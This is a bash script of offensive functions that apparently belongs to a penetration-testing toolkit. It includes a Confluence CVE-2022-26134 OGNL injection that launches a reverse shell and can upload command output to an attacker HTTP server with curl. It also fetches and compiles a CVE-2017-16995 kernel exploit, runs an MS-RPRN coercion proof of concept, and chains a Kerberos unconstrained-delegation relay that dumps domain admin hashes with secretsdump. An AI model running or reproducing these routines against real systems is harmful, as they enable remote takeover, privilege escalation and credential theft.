#!/bin/bash
perform_cve_2022_26134() {

    local confluence_port=$1
    local confluence_ip=$2
    if [ -z "$counter" ]; then
        counter=0
    fi
    counter=$((counter + 1))
    if [ -z "$confluence_port" ]; then
        confluence_port=8090
    fi
    if [ -z "$confluence_ip" ]; then
        confluence_ip=$ip
    fi
    if [ -z "$cmd" ]; then
        cmd=$(get_bash_reverse_shell basic)    
    fi  
    if [[ "$output_cmd" == "yes" ]] && [[ ! -z "$http_port" ]] && [[ ! -z "$http_ip" ]]; then        
        if [ -f "log/output$counter" ]; then
            rm -f log/output$counter
        fi
        cmd=$cmd' &> /tmp/output'$counter'; curl -T /tmp/output'$counter' http://'$http_ip:$http_port'/log/output'$counter
    fi
    echo $cmd | tee -a $trail_log
    local ognl="\${new javax.script.ScriptEngineManager().getEngineByName(\"nashorn\").eval(\"new java.lang.ProcessBuilder().command('bash','-c','$cmd').start()\")}"
    echo "OGNL: $ognl" | tee -a $trail_log
    ognl=$(urlencode_noslash "$ognl")
    echo "OGNL payload: $ognl" | tee -a $trail_log
    curl -v http://$confluence_ip:$confluence_port/$ognl/ 2>&1 | tee -a $trail_log
}

perform_cve_2017_16995() {
    local target_os=$1
    if [ -z "$target_os" ]; then
        target_os="ubuntu:16.04"
    fi
    mkdir -p exploit
    pushd exploit
    if [ ! -f "45010.c" ]; then
        wget "https://www.exploit-db.com/download/45010" -O 45010.c
    fi
    if [ ! -f "45010" ]; then
        echo "45010 binary not found, compiling..."
        docker run -it -v $(pwd):/opt/exploit --rm $target_os /bin/bash -c "apt update && apt install -y gcc && cd /opt/exploit && gcc -o 45010 45010.c"
    else
        echo "45010 binary already exists, skipping compilation. Remove it first if you want to recompile."
    fi
    download_linux "45010" "45010"
    popd
}

perform_ms_rprn() {

    #local coerce_poc='https://raw.githubusercontent.com/p0dalirius/windows-coerced-authentication-methods/refs/heads/master/methods/MS-PAR%20-%20Print%20System%20Asynchronous%20Remote%20Protocol/00.%20Remote%20call%20to%20RpcAsyncOpenPrinter%20(opnum%200)/coerce_poc.py'
    local coerce_poc='https://raw.githubusercontent.com/p0dalirius/windows-coerced-authentication-methods/refs/heads/master/methods/MS-RPRN%20-%20Print%20System%20Remote%20Protocol/65.%20Remote%20call%20to%20RpcRemoteFindFirstPrinterChangeNotificationEx%20(opnum%2065)/coerce_poc.py'

    if [[ ! -f "coerce_poc.py" ]]; then
        echo "Downloading MS-RPRN Coerce PoC..."
        wget $coerce_poc -O coerce_poc.py    
    fi
    if [[ ! -f "coerce_poc.py" ]]; then
        echo "Failed to download coerce_poc.py. Please check your internet connection."
        return 1
    fi
    if [[ -z "$domain" ]] || [[ -z "$username" ]] || [[ -z "$password" ]]; then
        echo "Domain, username, and password must be set before running this function."
        return 1
    fi
    if [[ -z "$responder_ip" ]] || [[ -z "$dc_ip" ]]; then
        echo "Responder IP and DC IP must be set before running this function."
        return 1
    fi
    python3 coerce_poc.py -d $domain -u $username -p $password $responder_ip $dc_ip
}

perform_user_unconstrained_delegation() {
    
    if [[ -z "$username" ]] || [[ -z "$password" ]] || [[ -z "$domain" ]]; then
        echo "username, password and domain must be set before running this function."
        return 1
    fi
    if [[ -z "$kud_username" ]] || [[ -z "$kud_password" ]]; then
        echo "kud_username and kud_password must be set before running this function."
        return 1
    fi
    if [[ -z "$dc_ip" ]] || [[ -z "$dc_hostname" ]]; then
        echo "dc_ip and dc_hostname must be set before running this function."
        return 1
    fi
    echo "Adding the DC hostname and domain to the hosts file..."
    add_host $dc_hostname $dc_ip
    add_host $domain $dc_ip    
    if [[  ! -f "windows_hashgenerator.py" ]]; then
        echo "Copying windows_hashgenerator.py..."
        cp $SCRIPTDIR/../python/windows_hashgenerator.py .
    fi
    if [[ ! -d "krbrelayx" ]]; then
        echo "Cloning krbrelayx repository..."
        git clone https://github.com/dirkjanm/krbrelayx.git
    fi
    if [[ -z "$attacker_ip" ]]; then
        attacker_ip=$(get_host_ip)
    fi
    pushd krbrelayx
    if pgrep -f "krbrelayx.py"; then
        echo "krbrelayx is already running, please stop it first."
    else
        ./krbrelayx.py -s "${domain}$kud_username" -p $kud_password -dc-ip $dc_ip 
        return 0
    fi
    ccache_file="$dc_hostname"'$@'$domain'_krbtgt@'$domain'.ccache'
    echo "Checking for ccache file: $ccache_file"
    if [[ -f $ccache_file ]]; then
        echo "Exporting ccache file..."
        export KRB5CCNAME=$(pwd)/$ccache_file
        impacket-secretsdump -just-dc-user jeffadmin -no-pass -k $dc_hostname
    else
        python3 addspn.py -u "$domain\\$username" -p $password  --target-type samname -t "$kud_username" -s 'cifs/attacker.'$domain $dc_ip
        python3 dnstool.py -u "$domain\\$username" -p $password -r "attacker.$domain" -a add -d $attacker_ip $dc_ip
        python3 printerbug.py $domain/$username:$password@$dc_hostname attacker.$domain
    fi
    popd
}